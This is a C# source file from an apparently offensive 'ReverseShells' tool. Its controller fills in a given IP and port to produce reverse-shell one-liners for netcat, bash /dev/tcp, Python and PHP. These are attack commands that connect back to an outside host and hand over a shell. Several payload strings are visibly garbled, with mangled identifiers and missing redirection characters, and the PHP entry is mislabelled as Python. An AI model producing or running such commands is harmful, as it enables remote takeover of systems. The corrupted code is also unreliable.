using ReverseShells.Models;
using System.Collections.Generic;
using ReverseShells.Enums;

namespace ReverseShells.Controllers
{
    class ReverseShellController
    {
        private ReverseShellType _reverseShellType;
        private string _ip = string.Empty;
        private string _port = string.Empty;

        public ReverseShellController(ReverseShellType reverseShellType, string ip, string port)
        {
            _reverseShellType = reverseShellType;
            _ip = ip;
            _port = port;
        }

        public List<Command> GetReverseShellCommands()
        {
            List<Command> commands = new List<Command>();

            switch (_reverseShellType)
            {
                case ReverseShellType.Netcat:
                    commands.Add(new Command()
                    {
                        Description = "Netcat for Linux Reverse Shell",
                        CommandText = string.Format("nc {0} {1} -e /bin/sh", _ip, _port)
                    });
                    commands.Add(new Command()
                    {
                        Description = "Netcat for Windows Reverse Shell",
                        CommandText = string.Format("nc {0} {1} -e cmd.exe", _ip, _port)
                    });
                    commands.Add(new Command()
                    {
                        Description = "Netcat for Linux Reverse Shell whem -e not possible",
                        CommandText = string.Format("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2 &1|nc {0} {1} /tmp/f", _ip, _port)
                    });
                    break;
                case ReverseShellType.Bash:
                    commands.Add(new Command()
                    {
                        Description = "Bash Reverse Shell",
                        CommandText = string.Format("bash -i & /dev/tcp/{0}/{1} 0 &1", _ip, _port)
                    });
                    break;
                case ReverseShellType.Python:
                    commands.Add(new Command()
                    {
                        Description = "Python Reverse Shell",
                        CommandText = string.Format("python -c 'import socket, subprocess, os; s=socket. socket (socket ..;;F_ INET, socket.SOCK_STREAL1); s.connect( (\"{0}\",{1})); os.dup2 (s.fileno() ,0); os.dup2(s.fileno(l,1); os.dup2(s.file:oo(),2); p~subprocess.call( 1\" / bin / sh\",\" - i\"] I;'", _ip, _port)
                    });
                    break;
                case ReverseShellType.PHP:
                    commands.Add(new Command()
                    {
                        Description = "Python Reverse Shell",
                        CommandText = string.Format("php -r '$sod:~fsockopen(\"{0}\", {1}) ;exec(\"/bin/sh -i &3 &3 2 &3\");'", _ip, _port)
                    });
                    break;
                case ReverseShellType.Perl:
                    break;
                case ReverseShellType.Java:
                    break;
                case ReverseShellType.Ruby:
                    break;
                default:
                    break;
            }

            return commands;
        }
    }
}
